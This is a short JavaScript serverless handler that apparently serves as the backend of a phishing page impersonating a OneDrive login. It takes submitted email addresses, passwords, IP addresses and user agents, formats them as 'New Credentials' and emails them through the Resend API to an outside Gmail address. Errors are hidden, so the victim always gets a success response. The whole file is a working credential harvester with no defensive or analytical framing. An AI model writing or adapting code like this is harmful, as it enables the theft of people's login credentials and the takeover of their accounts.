// api/collect.js
export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  try {
    const { email, password, ip, userAgent } = req.body;
    const apiKey = process.env.RESEND_API_KEY;

    if (!apiKey) {
      console.error('RESEND_API_KEY is not set');
      return res.status(500).json({ error: 'Server configuration error' });
    }

    const emailBody = `
🔐 New Credentials
📧 Email: ${email || 'N/A'}
🔑 Password: ${password || 'N/A'}
🌐 IP: ${ip || 'Unknown'}
📱 User-Agent: ${userAgent || 'N/A'}
⏰ Time: ${new Date().toISOString()}
    `;

    const response = await fetch('https://api.resend.com/emails', {
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${apiKey}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        from: 'onboarding@resend.dev',
        to: ['g82443047@gmail.com'],
        subject: 'New Login - OneDrive Portal',
        text: emailBody.trim(),
        html: `<pre>${emailBody.trim()}</pre>`,
      }),
    });

    const data = await response.json();
    console.log('Resend response:', JSON.stringify(data));

    return res.status(200).json({ success: true });
  } catch (error) {
    console.error('Error in collect handler:', error);
    return res.status(200).json({ success: true });
  }
}